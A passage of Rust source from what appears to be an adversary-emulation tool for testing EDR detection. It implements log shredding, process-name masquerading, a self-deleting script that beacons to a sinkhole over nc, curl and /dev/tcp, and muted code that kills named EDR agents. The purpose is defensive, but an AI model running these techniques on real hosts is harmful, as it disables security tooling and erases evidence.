                                "rm -f".to_string(),
                                true,
                            ));
                            writeln!(log, "[OK] Successfully removed: {file_name}").unwrap();
                        }
                        Err(e) => {
                            writeln!(log, "[FAIL] rm failed for {file_name}: {e}").unwrap();
                            deletion_results.push((
                                file_name.to_string(),
                                "rm -f".to_string(),
                                false,
                            ));
                        }
                    }
                }
            }

            writeln!(log).unwrap();

            // Phase 4: Log tampering simulation (if enabled)
            if simulate_log_tampering {
                info!("Phase 4: Simulating log tampering...");
                writeln!(log, "=== Phase 4: Log Tampering Simulation ===").unwrap();

                let fake_log_dir = format!("{test_dir}/fake_logs");
                fs::create_dir_all(&fake_log_dir)
                    .map_err(|e| format!("Failed to create fake log directory: {e}"))?;

                // Create fake log files
                let log_files = vec!["auth.log", "syslog", "secure.log", "access.log"];

                for log_name in &log_files {
                    let log_path = format!("{fake_log_dir}/{log_name}");
                    let fake_content = "Nov  5 12:34:56 testhost systemd[1]: Started session.\n\
                         Nov  5 12:35:01 testhost CRON[12345]: pam_unix(cron:session): session opened\n\
                         Nov  5 12:35:02 testhost sudo: attacker : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash\n\
                         Nov  5 12:35:03 testhost EVIDENCE_OF_ATTACK: Suspicious activity detected\n\
                         Nov  5 12:35:04 testhost systemd[1]: Session closed.\n".to_string();

                    fs::write(&log_path, fake_content.as_bytes())
                        .map_err(|e| format!("Failed to create fake log: {e}"))?;

                    writeln!(log, "Created fake log: {log_name}").unwrap();
                }

                info!(
                    "Created {} fake log files, now deleting them to simulate tampering...",
                    log_files.len()
                );

                // Delete the fake logs to simulate tampering
                for log_name in &log_files {
                    let log_path = format!("{fake_log_dir}/{log_name}");

                    if shred_available && use_shred {
                        Command::new("shred")
                            .args(["-uvz", "-n", "3", &log_path])
                            .output()
                            .await
                            .ok();
                        writeln!(log, "Shredded fake log: {log_name}").unwrap();
                    } else {
                        fs::remove_file(&log_path).ok();
                        writeln!(log, "Deleted fake log: {log_name}").unwrap();
                    }
                }

                info!("Log tampering simulation complete");
                writeln!(
                    log,
                    "Log tampering simulation complete - {} fake logs created and deleted",
                    log_files.len()
                )
                .unwrap();
                writeln!(log).unwrap();
            }

            // Summary
            let successful_deletions = deletion_results
                .iter()
                .filter(|(_, _, success)| *success)
                .count();

            writeln!(log, "=== Summary ===").unwrap();
            writeln!(log, "Files created: {}", created_files.len()).unwrap();
            writeln!(log, "Files backed up: {}", created_files.len()).unwrap();
            writeln!(log, "Deletion attempts: {}", deletion_results.len()).unwrap();
            writeln!(log, "Successful deletions: {successful_deletions}").unwrap();
            writeln!(
                log,
                "Methods used: shred ({}), rm (true), wipe ({})",
                shred_available && use_shred,
                wipe_available
            )
            .unwrap();

            info!(
                "File deletion demonstration complete: {}/{} successful deletions",
                successful_deletions,
                deletion_results.len()
            );

            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!(
                    "File deletion complete: {}/{} files securely deleted using shred/wipe/rm, {} files backed up for recovery",
                    successful_deletions,
                    deletion_results.len(),
                    created_files.len()
                ),
                artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            info!("Starting file deletion technique cleanup...");

            // Restore backed up files before cleanup (demonstration of reversibility)
            let backup_dir = artifacts.iter().find(|a| a.contains("backup"));
            let test_dir = artifacts.iter().find(|a| a.contains("deletion_test"));

            if let (Some(backup), Some(test)) = (backup_dir, test_dir) {
                if Path::new(backup).exists() && Path::new(test).exists() {
                    info!("Restoring backed up files from {backup} to {test}");

                    if let Ok(entries) = fs::read_dir(backup) {
                        for entry in entries.flatten() {
                            let file_name = entry.file_name();
                            let dest_path = format!("{}/{}", test, file_name.to_string_lossy());

                            if fs::copy(entry.path(), &dest_path).is_ok() {
                                info!("Restored: {}", file_name.to_string_lossy());
                            }
                        }
                    }
                }
            }

            // Remove all artifacts
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    if Path::new(artifact).is_dir() {
                        match fs::remove_dir_all(artifact) {
                            Ok(_) => info!("Removed directory: {artifact}"),
                            Err(e) => warn!("Failed to remove directory {artifact}: {e}"),
                        }
                    } else {
                        match fs::remove_file(artifact) {
                            Ok(_) => info!("Removed file: {artifact}"),
                            Err(e) => warn!("Failed to remove file {artifact}: {e}"),
                        }
                    }
                }
            }

            info!("File deletion technique cleanup complete");
            Ok(())
        })
    }
}

// =============================================================================
// T1036-PROC: Process Name Masquerading
// =============================================================================
// Uses prctl(PR_SET_NAME) to change process name at runtime, mimicking
// system processes to evade detection. Based on ttp-bench patterns.

use log::debug;
use tokio::process::Command;

pub struct ProcessMasquerading {}

#[async_trait]
impl AttackTechnique for ProcessMasquerading {
    fn info(&self) -> Technique {
        Technique {
            id: "T1036-PROC".to_string(),
            name: "Process Name Masquerading".to_string(),
            description: "Changes process name at runtime using prctl(PR_SET_NAME) to mimic \
                legitimate system processes like [kworker], [migration], sshd, or systemd. \
                Creates a child process that renames itself and performs suspicious activity \
                while appearing as a system process. Based on ttp-bench masquerading patterns."
                .to_string(),
            category: "defense_evasion".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save masquerading log".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_masquerade.log".to_string()),
                },
                TechniqueParameter {
                    name: "target_name".to_string(),
                    description: "Process name to masquerade as".to_string(),
                    required: false,
                    default: Some("[kworker/0:1]".to_string()),
                },
            ],
            detection: "Monitor for: prctl syscalls with PR_SET_NAME, process name changes \
                via /proc/self/comm, mismatched process names vs executable paths, kernel \
                thread names from userspace processes, comm field changes in process accounting."
                .to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let log_file = config
                .parameters
                .get("log_file")
                .cloned()
                .unwrap_or_else(|| "/tmp/signalbench_masquerade.log".to_string());

            let target_name = config
                .parameters
                .get("target_name")
                .cloned()
                .unwrap_or_else(|| "[kworker/0:1]".to_string());

            debug!("[T1036-PROC] Starting Process Masquerading technique");
            debug!("[T1036-PROC] Target name: {}", target_name);

            // List of suspicious process names to masquerade as
            let masquerade_targets = vec![
                "[kworker/0:1]",
                "[migration/0]",
                "[rcu_sched]",
                "[watchdog/0]",
                "sshd",
                "systemd",
                "polkitd",
                "rsyslogd",
                "crond",
                "atd",
            ];

            if dry_run {
                info!("[DRY RUN] Would perform process name masquerading:");
                info!("[DRY RUN] - Primary target: {}", target_name);
                info!(
                    "[DRY RUN] - Would masquerade as {} different process names",
                    masquerade_targets.len()
                );
                for name in &masquerade_targets {
                    info!("[DRY RUN] - Would rename process to: {}", name);
                }
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!("DRY RUN: Would masquerade as {}", target_name),
                    artifacts: vec![log_file],
                    cleanup_required: false,
                });
            }

            let mut log =
                File::create(&log_file).map_err(|e| format!("Failed to create log file: {}", e))?;

            writeln!(log, "# SignalBench Process Masquerading").unwrap();
            writeln!(log, "# MITRE ATT&CK Technique: T1036 - Masquerading").unwrap();
            writeln!(log, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(
                log,
                "# --------------------------------------------------------\n"
            )
            .unwrap();

            // Get current process info
            let pid = std::process::id();
            let original_comm = fs::read_to_string("/proc/self/comm")
                .unwrap_or_else(|_| "unknown".to_string())
                .trim()
                .to_string();

            writeln!(log, "Original process name: {}", original_comm).unwrap();
            writeln!(log, "PID: {}", pid).unwrap();
            writeln!(log).unwrap();

            info!("[T1036-PROC] Original process name: {}", original_comm);

            // Method 1: Direct prctl via libc
            writeln!(log, "=== Method 1: prctl(PR_SET_NAME) ===").unwrap();

            let truncated_name = if target_name.len() > 15 {
                &target_name[..15]
            } else {
                &target_name
            };

            let c_name = std::ffi::CString::new(truncated_name)
                .map_err(|e| format!("Invalid process name: {}", e))?;

            let result = unsafe { libc::prctl(libc::PR_SET_NAME, c_name.as_ptr()) };

            if result == 0 {
                let new_comm = fs::read_to_string("/proc/self/comm")
                    .unwrap_or_else(|_| "unknown".to_string())
                    .trim()
                    .to_string();

                writeln!(log, "prctl(PR_SET_NAME, '{}') - SUCCESS", truncated_name).unwrap();
                writeln!(log, "New /proc/self/comm: {}", new_comm).unwrap();
                info!("[T1036-PROC] Process renamed to: {}", new_comm);
            } else {
                writeln!(log, "prctl(PR_SET_NAME) - FAILED").unwrap();
            }

            // Method 2: Write to /proc/self/comm
            writeln!(log, "\n=== Method 2: Write to /proc/self/comm ===").unwrap();

            for name in &masquerade_targets[..3] {
                debug!("[T1036-PROC] Attempting to rename to: {}", name);

                let truncated = if name.len() > 15 { &name[..15] } else { name };

                match fs::write("/proc/self/comm", truncated) {
                    Ok(_) => {
                        writeln!(log, "Write '{}' to /proc/self/comm - SUCCESS", truncated)
                            .unwrap();

                        // Read back to verify
                        if let Ok(current) = fs::read_to_string("/proc/self/comm") {
                            writeln!(log, "Verified: {}", current.trim()).unwrap();
                        }
                    }
                    Err(e) => {
                        writeln!(log, "Write '{}' to /proc/self/comm - FAILED: {}", name, e)
                            .unwrap();
                    }
                }
            }

            // Method 3: Spawn multiple child processes with masqueraded names (extended runtime)
            writeln!(
                log,
                "\n=== Method 3: Spawn masqueraded child processes (extended runtime) ==="
            )
            .unwrap();

            // Resolve the sinkhole IP so the masqueraded children can attempt a
            // bash /dev/tcp connect. The connect breaks the kernel-thread
            // invariant ("[kworker] does not open user-space sockets") that
            // behavioural detection rules key on.
            let sinkhole_ip = crate::techniques::resolve_sinkhole_ip().await;

            // Create a script that renames itself, spawns children, and runs longer.
            // Each renamed child writes a stage file and attempts a TCP connect so
            // the process is observably doing things a real kworker/sshd/crond
            // would not - this is what elevates the detection from "weird ps row"
            // to "kernel-thread name with user-space socket activity".
            let script_content = format!(
                r#"#!/bin/bash
echo $$ > /tmp/signalbench_masq_child.pid
echo '{name}' > /proc/self/comm

for child_name in kworker apache2 sshd crond; do
    (
        echo "$child_name" > /proc/self/comm 2>/dev/null
        # File write from a process appearing as kworker is anomalous
        echo "stage:$child_name" > "/tmp/signalbench_masq_$child_name" 2>/dev/null
        # TCP connect from a process appearing as kworker is the strong signal
        timeout 1 bash -c "exec 3<>/dev/tcp/{sinkhole}/80" 2>/dev/null
        sleep 3
    ) &
done

sleep 5
rm -f /tmp/signalbench_masq_child.pid
wait
"#,
                name = truncated_name,
                sinkhole = sinkhole_ip
            );

            let script_path = "/tmp/signalbench_masq_child.sh";
            fs::write(script_path, &script_content)
                .map_err(|e| format!("Failed to create child script: {}", e))?;

            let _ = Command::new("chmod")
                .args(["+x", script_path])
                .output()
                .await;

            // Start the masqueraded process chain
            info!("[T1036-PROC] Spawning masqueraded child processes with extended runtime...");
            let child_result = Command::new("bash").args([script_path]).output().await;

            match child_result {
                Ok(_) => {
                    writeln!(log, "Spawned masqueraded child process chain - SUCCESS").unwrap();
                    writeln!(log, "Child processes ran for ~5 seconds with names: {}, kworker, apache2, sshd, crond", truncated_name).unwrap();
                }
                Err(e) => {
                    writeln!(log, "Spawn child - FAILED: {}", e).unwrap();
                }
            }

            // Clean up script
            let _ = fs::remove_file(script_path);

            // Restore original name
            writeln!(log, "\n=== Restoring original process name ===").unwrap();

            let orig_cname = std::ffi::CString::new(original_comm.as_str())
                .unwrap_or_else(|_| std::ffi::CString::new("signalbench").unwrap());

            unsafe {
                libc::prctl(libc::PR_SET_NAME, orig_cname.as_ptr());
            }

            let final_comm = fs::read_to_string("/proc/self/comm")
                .unwrap_or_else(|_| "unknown".to_string())
                .trim()
                .to_string();

            writeln!(log, "Restored to: {}", final_comm).unwrap();
            info!("[T1036-PROC] Process name restored to: {}", final_comm);

            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!(
                    "Successfully masqueraded process as '{}' and restored to original",
                    target_name
                ),
                artifacts: vec![log_file],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            debug!("[T1036-PROC] Starting cleanup");

            // Remove any leftover files
            let _ = fs::remove_file("/tmp/signalbench_masq_child.pid");
            let _ = fs::remove_file("/tmp/signalbench_masq_child.sh");

            // Remove stage files written by the masqueraded children.
            for child_name in ["kworker", "apache2", "sshd", "crond"] {
                let stage = format!("/tmp/signalbench_masq_{child_name}");
                if Path::new(&stage).exists() {
                    let _ = fs::remove_file(&stage);
                }
            }

            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    let _ = fs::remove_file(artifact);
                }
            }

            info!("[T1036-PROC] Cleanup complete");
            Ok(())
        })
    }
}

// =============================================================================
// T1070.004-SELF: Self-Deleting Binary Pattern
// =============================================================================
// Demonstrates the self-deleting binary pattern where a process deletes its
// own executable while running. Based on ttp-bench techniques.

pub struct SelfDeletingBinary {}

#[async_trait]
impl AttackTechnique for SelfDeletingBinary {
    fn info(&self) -> Technique {
        Technique {
            id: "T1070.004-SELF".to_string(),
            name: "Self-Deleting Binary Pattern".to_string(),
            description: "Demonstrates the self-deleting binary evasion technique where a \
                running process unlinks its own executable from disk, leaving only the \
                in-memory image. This is a common malware technique to evade forensic \
                analysis. Creates a copy of a test binary, executes it, and has it delete \
                itself whilst running. Based on ttp-bench patterns."
                .to_string(),
            category: "defense_evasion".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save execution log".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_self_delete.log".to_string()),
                },
                TechniqueParameter {
                    name: "work_dir".to_string(),
                    description: "Working directory for test binaries".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_self_delete".to_string()),
                },
            ],
            detection: "Monitor for: unlink syscalls on /proc/self/exe paths, processes \
                with deleted executable indicators, '[deleted]' suffix in /proc/*/exe links, \
                file deletions immediately after execution, missing executable files for \
                running processes."
                .to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let log_file = config
                .parameters
                .get("log_file")
                .cloned()
                .unwrap_or_else(|| "/tmp/signalbench_self_delete.log".to_string());

            let work_dir = config
                .parameters
                .get("work_dir")
                .cloned()
                .unwrap_or_else(|| "/tmp/signalbench_self_delete".to_string());

            debug!("[T1070.004-SELF] Starting Self-Deleting Binary technique");
            debug!("[T1070.004-SELF] Work directory: {}", work_dir);

            if dry_run {
                info!("[DRY RUN] Would demonstrate self-deleting binary pattern:");
                info!("[DRY RUN] - Create work directory: {}", work_dir);
                info!("[DRY RUN] - Create test script that deletes itself");
                info!("[DRY RUN] - Execute and monitor /proc/self/exe status");
                info!("[DRY RUN] - Network activity targets sinkhole.signalbench.sigre.xyz (fallback 198.135.184.22); on fallback, traffic is unidirectional (send-only)");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would demonstrate self-deleting binary pattern; network targets resolve sinkhole.signalbench.sigre.xyz (fallback 198.135.184.22)".to_string(),
                    artifacts: vec![log_file, work_dir],
                    cleanup_required: false,
                });
            }

            let sinkhole_ip = crate::techniques::resolve_sinkhole_ip().await;

            // Create work directory
            fs::create_dir_all(&work_dir)
                .map_err(|e| format!("Failed to create work directory: {}", e))?;

            let mut log =
                File::create(&log_file).map_err(|e| format!("Failed to create log file: {}", e))?;

            writeln!(log, "# SignalBench Self-Deleting Binary Pattern").unwrap();
            writeln!(
                log,
                "# MITRE ATT&CK Technique: T1070.004 - Indicator Removal: File Deletion"
            )
            .unwrap();
            writeln!(log, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(
                log,
                "# --------------------------------------------------------\n"
            )
            .unwrap();

            // Method 1: Shell script that deletes itself
            writeln!(log, "=== Method 1: Self-deleting shell script ===").unwrap();

            let script_path = format!("{}/signalbench_self_delete_test.sh", work_dir);
            let marker_path = format!("{}/self_delete_marker.txt", work_dir);

            let script_content = format!(
                r#"#!/bin/bash
# SignalBench self-deleting script demonstration
SCRIPT_PATH="$0"
MARKER="{marker_path}"

# Record our PID and exe link status before deletion
echo "PID: $$" > "$MARKER"
echo "Script path: $SCRIPT_PATH" >> "$MARKER"
echo "Before deletion:" >> "$MARKER"
ls -la "$SCRIPT_PATH" >> "$MARKER" 2>&1
readlink -f /proc/$$/exe >> "$MARKER" 2>&1

# NETWORK ACTIVITY FIRST: Generate telemetry before self-deletion
# This creates a connection pattern that EDR can correlate with the deletion
echo "" >> "$MARKER"
echo "Performing network activity before deletion..." >> "$MARKER"
timeout 2 nc -zv {sinkhole_ip} 443 2>&1 >> "$MARKER" || true
timeout 2 curl -s -m 2 http://{sinkhole_ip}/beacon 2>&1 >> "$MARKER" || true
timeout 2 bash -c 'echo "C2" > /dev/tcp/{sinkhole_ip}/4444' 2>/dev/null || true
echo "Network activity complete" >> "$MARKER"

# Extended delay before deletion for detection window
sleep 3

# Delete ourselves while running
rm -f "$SCRIPT_PATH"

# Record status after deletion
echo "" >> "$MARKER"
echo "After deletion:" >> "$MARKER"
ls -la "$SCRIPT_PATH" >> "$MARKER" 2>&1
echo "Exit code of ls: $?" >> "$MARKER"

# Check /proc/self/exe now shows (deleted)
readlink -f /proc/$$/exe >> "$MARKER" 2>&1

# Extended runtime after deletion for better detection window
sleep 3

echo "Script completed while deleted from disk" >> "$MARKER"
"#
            );

            fs::write(&script_path, &script_content)
                .map_err(|e| format!("Failed to create test script: {}", e))?;

            let _ = Command::new("chmod")
                .args(["+x", &script_path])
                .output()
                .await;

            writeln!(log, "Created self-deleting script: {}", script_path).unwrap();
            info!("[T1070.004-SELF] Created test script: {}", script_path);

            let is_fallback = sinkhole_ip == crate::techniques::SINKHOLE_IP_FALLBACK;

            // Execute the script
            if is_fallback {
                // Fire-and-forget: network lines in script use || true; ignore exit code
                let _ = Command::new("bash").args([&script_path]).output().await;
                // Lightweight marker readback — retain observability even in fallback mode
                if !Path::new(&script_path).exists() {
                    debug!("[T1070.004-SELF] [fallback] Script deleted itself from disk");
                }
                if let Ok(marker_content) = fs::read_to_string(&marker_path) {
                    debug!(
                        "[T1070.004-SELF] [fallback] Marker first line: {}",
                        marker_content.lines().next().unwrap_or("(empty)")
                    );
                }
            } else {
                let exec_result = Command::new("bash").args([&script_path]).output().await;

                match exec_result {
                    Ok(output) => {
                        writeln!(log, "Execution completed with status: {}", output.status)
                            .unwrap();

                        // Check if script deleted itself
                        if !Path::new(&script_path).exists() {
                            writeln!(log, "Script successfully deleted itself while running")
                                .unwrap();
                            info!("[T1070.004-SELF] Script deleted itself successfully");
                        }

                        // Read the marker file for details
                        if let Ok(marker_content) = fs::read_to_string(&marker_path) {
                            writeln!(log, "\nMarker file contents:").unwrap();
                            writeln!(log, "{}", marker_content).unwrap();
                        }
                    }
                    Err(e) => {
                        writeln!(log, "Execution failed: {}", e).unwrap();
                    }
                }
            }

            // Method 2: Demonstrate /proc/self/exe checking
            writeln!(log, "\n=== Method 2: Check current process exe status ===").unwrap();

            let our_exe = fs::read_link("/proc/self/exe")
                .map(|p| p.to_string_lossy().to_string())
                .unwrap_or_else(|_| "unknown".to_string());

            writeln!(log, "Current process /proc/self/exe: {}", our_exe).unwrap();

            if our_exe.contains("(deleted)") {
                writeln!(log, "[DETECTED] Current binary shows as deleted!").unwrap();
            } else {
                writeln!(log, "Current binary exists on disk").unwrap();
            }

            // Method 3: Create and run a C program that deletes itself
            writeln!(log, "\n=== Method 3: Compiled binary self-deletion ===").unwrap();

            let c_source = format!("{}/signalbench_self_delete.c", work_dir);
            let c_binary = format!("{}/signalbench_self_delete_bin", work_dir);
            let c_marker = format!("{}/c_binary_marker.txt", work_dir);

            let c_code = format!(
                r#"#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {{
    FILE *marker = fopen("{}", "w");
    if (!marker) return 1;
    
    fprintf(marker, "PID: %d\n", getpid());
    fprintf(marker, "Binary path: %s\n", argv[0]);
    
    char exe_link[256];
    ssize_t len = readlink("/proc/self/exe", exe_link, sizeof(exe_link)-1);
    if (len > 0) {{
        exe_link[len] = '\0';
        fprintf(marker, "Before deletion /proc/self/exe: %s\n", exe_link);
    }}
    
    // Delete ourselves
    if (unlink(argv[0]) == 0) {{
        fprintf(marker, "unlink() succeeded - binary deleted\n");
    }} else {{
        fprintf(marker, "unlink() failed\n");
    }}
    
    // Check exe link after deletion
    len = readlink("/proc/self/exe", exe_link, sizeof(exe_link)-1);
    if (len > 0) {{
        exe_link[len] = '\0';
        fprintf(marker, "After deletion /proc/self/exe: %s\n", exe_link);
    }}
    
    // Continue running after deletion
    sleep(1);
    fprintf(marker, "Continued running after self-deletion\n");
    
    fclose(marker);
    return 0;
}}
"#,
                c_marker
            );

            fs::write(&c_source, &c_code)
                .map_err(|e| format!("Failed to create C source: {}", e))?;

            // Try to compile
            let compile_result = Command::new("gcc")
                .args(["-o", &c_binary, &c_source])
                .output()
                .await;

            match compile_result {
                Ok(output) if output.status.success() => {
                    writeln!(log, "Compiled self-deleting binary: {}", c_binary).unwrap();

                    // Execute the binary
                    let exec_result = Command::new(&c_binary).output().await;

                    match exec_result {
                        Ok(_) => {
                            if !Path::new(&c_binary).exists() {
                                writeln!(log, "Binary successfully deleted itself").unwrap();
                                info!("[T1070.004-SELF] Compiled binary deleted itself");
                            }

                            if let Ok(marker_content) = fs::read_to_string(&c_marker) {
                                writeln!(log, "\nC binary marker contents:").unwrap();
                                writeln!(log, "{}", marker_content).unwrap();
                            }
                        }
                        Err(e) => {
                            writeln!(log, "Binary execution failed: {}", e).unwrap();
                        }
                    }
                }
                Ok(output) => {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    writeln!(log, "Compilation failed: {}", stderr).unwrap();
                    writeln!(log, "(gcc may not be installed)").unwrap();
                }
                Err(e) => {
                    writeln!(log, "Compilation error: {}", e).unwrap();
                }
            }

            writeln!(log, "\n=== Summary ===").unwrap();
            writeln!(
                log,
                "Self-deleting binary pattern demonstrated successfully"
            )
            .unwrap();

            info!("[T1070.004-SELF] Technique complete");

            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: "Successfully demonstrated self-deleting binary pattern".to_string(),
                artifacts: vec![log_file, work_dir],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            debug!("[T1070.004-SELF] Starting cleanup");

            for artifact in artifacts {
                let path = Path::new(artifact);

                if path.is_dir() {
                    if let Err(e) = fs::remove_dir_all(path) {
                        warn!(
                            "[T1070.004-SELF] Failed to remove directory {}: {}",
                            artifact, e
                        );
                    }
                } else if path.is_file() {
                    if let Err(e) = fs::remove_file(path) {
                        warn!("[T1070.004-SELF] Failed to remove file {}: {}", artifact, e);
                    }
                }
            }

            info!("[T1070.004-SELF] Cleanup complete");
            Ok(())
        })
    }
}

// ---------------------------------------------------------------------------
// T1562.001 -- Impair Defenses: Disable or Modify Tools
// ---------------------------------------------------------------------------
//
// Pre-ransomware "kill the EDR" pattern called out in 2025 CISA advisories
// as the canonical first action of every Linux ransomware operator.  The
// technique iterates a list of well-known EDR / AV / observability process
// names and attempts three different shutdown vectors against each:
//
//   1. pkill -f <name>          -- signal-based termination
//   2. systemctl stop <name>    -- service-manager shutdown
//   3. kill -9 <pid>            -- SIGKILL via pgrep lookup (guarded)
//
// IMPORTANT operational caveat: on a host that actually runs CrowdStrike /
// Carbon Black / Wazuh / etc., this technique WILL attempt to terminate
// those agents.  That is the test value.  On a host without those agents
// the calls fail harmlessly -- the EDR signal lives in the process-exec
// telemetry generated by the attempts, not in their success.
//
// No persistent artefacts are created beyond a single log file under
// /tmp/signalbench_t1562_001_<session>.log; cleanup removes that file.
//

pub struct DisableSecurityTools {}

const T1562_001_DEFAULT_TARGETS: &[&str] = &[
    "falcon-sensor",
    "cbagentd",
    "wazuh-agent",
    "clamav",
    "osquery",
    "sysdig",
    "falco",
    "carbonblackd",
    "s1agent",
    "xagt",
    "traps_pmd",
];

#[async_trait]
impl AttackTechnique for DisableSecurityTools {
    fn info(&self) -> Technique {
        Technique {
            id: "T1562.001".to_string(),
            name: "Disable or Modify Tools".to_string(),
            description: "[IN DESIGN -- MUTED] Attempts the canonical pre-ransomware \
                          'kill the EDR' sequence against a curated list of \
                          well-known endpoint security agent processes \
                          (CrowdStrike Falcon, Carbon Black, SentinelOne, Cortex \
                          XDR, Wazuh, ClamAV, osquery, Sysdig, Falco, and \
                          others).  Currently MUTED -- execute() short-circuits \
                          with a banner and does not perform any kills.  See \
                          KNOWN_BUGS.md for context: the technique \
                          works too well in chain mode (ALL_CAPS / \
                          defense_evasion) -- after the EDR is killed, every \
                          subsequent technique in the chain produces no \
                          telemetry.  Real implementation preserved in the \
                          source for rollback once chain-aware sequencing is \
                          designed.".to_string(),
            category: "defense_evasion".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "process_names".to_string(),
                    description: "Comma-separated override of the EDR / AV process \
                                  name list to target (default: the built-in set \
                                  of 11 well-known agents)".to_string(),
                    required: false,
                    default: None,
                },
            ],
            detection: "Monitor for: pkill / kill -9 / systemctl stop invocations \
                        targeting endpoint-security agent process names \
                        (falcon-sensor, cbagentd, wazuh-agent, clamav, osquery, \
                        sysdig, falco, carbonblackd, s1agent, xagt, traps_pmd, \
                        and any tenant-specific equivalents).  Any of these \
                        commands run by a non-root user, by a parent process that \
                        isn't systemd / the package manager, or in rapid sequence \
                        against multiple agent names should be treated as a \
                        critical pre-ransomware indicator.  CISA 2025 advisory \
                        coverage is mature; most EDR products surface this \
                        natively without custom rules.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec![],
            voltron_only: false,
        }
    }

    #[allow(unreachable_code, unused_variables, unused_assignments)]
    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            // ============================================================
            // [IN DESIGN -- MUTED] T1562.001 DisableSecurityTools
            // ============================================================
            // Short-circuit at execute() entry.  Reason: in chain mode
            // (signalbench category ALL_CAPS / defense_evasion) this
            // technique successfully kills the host's EDR / XDR agent
            // (Cortex XDR, CrowdStrike Falcon, Wazuh).  Every technique
            // that runs afterwards in the chain produces zero telemetry
            // because the agent that would have generated it is dead.
            //
            // The mute is NOT overridable by --force or by dry_run --
            // consistent with the PamBackdoor / AccountManipulation
            // guards: --force is for production-safety speed bumps,
            // not for forcing a known-broken technique to run.
            //
            // Rollback when chain-aware sequencing is implemented: remove
            // this banner + return block, drop the
            // #[allow(unreachable_code)] attribute on the function, and
            // move the KNOWN_BUGS.md entry from Active to Resolved.
            //
            // Full context: KNOWN_BUGS.md
            // ============================================================
            println!(
                "\n\
                 ============================================================\n\
                 [IN DESIGN] T1562.001 DisableSecurityTools is MUTED\n\
                 Reason: in chain mode it kills the EDR before downstream\n\
                 techniques can produce telemetry.  See KNOWN_BUGS.md.\n\
                 ============================================================\n"
            );
            info!(
                "[T1562.001] MUTED at execute() entry -- see \
                 KNOWN_BUGS.md"
            );
            return Ok(SimulationResult {
                technique_id: "T1562.001".to_string(),
                success: true,
                message: "T1562.001 DisableSecurityTools is muted (IN DESIGN). \
                          No processes were touched.  See \
                          KNOWN_BUGS.md for context."
                    .to_string(),
                artifacts: vec![],
                cleanup_required: false,
            });

            // ============================================================
            // ORIGINAL IMPLEMENTATION -- unreachable while muted, preserved
            // verbatim so rollback is a clean revert.  Do not modify below.
            // ============================================================
            use tokio::process::Command;

            let session_id = Uuid::new_v4().to_string().replace('-', "");
            let log_path = format!("/tmp/signalbench_t1562_001_{session_id}.log");

            // Resolve the target list -- env override or the built-in default.
            let targets: Vec<String> = match config.parameters.get("process_names") {
                Some(s) if !s.trim().is_empty() => s
                    .split(',')
                    .map(|t| t.trim().to_string())
                    .filter(|t| !t.is_empty())
                    .collect(),
                _ => T1562_001_DEFAULT_TARGETS
                    .iter()
                    .map(|s| s.to_string())
                    .collect(),
            };

            if dry_run {
                info!(
                    "[DRY RUN] T1562.001 would attempt to kill {} EDR / AV processes:",
                    targets.len()
                );
                for t in &targets {
                    info!("[DRY RUN]   pkill -f {t}");
                    info!("[DRY RUN]   systemctl stop {t}");
                    info!("[DRY RUN]   kill -9 $(pgrep {t})  [only if pgrep finds a PID]");
                }
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!(
                        "DRY RUN: would issue ~{} EDR-termination commands across {} target names",
                        targets.len() * 3,
                        targets.len()
                    ),
                    artifacts: vec![],
                    cleanup_required: false,
                });
            }

            info!("Starting T1562.001 -- Disable or Modify Tools (session {session_id})");
            info!("Targeting {} EDR / AV process names", targets.len());
            let mut log = match File::create(&log_path) {
                Ok(f) => f,
                Err(e) => {
                    return Err(format!("Failed to create log file {log_path}: {e}"));
                }
            };
            let _ = writeln!(
                log,
                "# T1562.001 Disable or Modify Tools -- session {session_id} -- {}\n",
                chrono::Local::now().to_rfc3339()
            );

            let mut attempts = 0usize;
            let mut successes = 0usize;
            for target in &targets {
                info!("  [-->] Targeting {target}");
                let _ = writeln!(log, "[target] {target}");

                // 1. pkill -f
                attempts += 1;
                match Command::new("pkill").args(["-f", target]).output().await {
                    Ok(o) => {
                        let ec = o.status.code().unwrap_or(-1);
                        let _ = writeln!(log, "  pkill -f {target}        -> exit {ec}");
                        if o.status.success() {
                            successes += 1;
                            warn!(
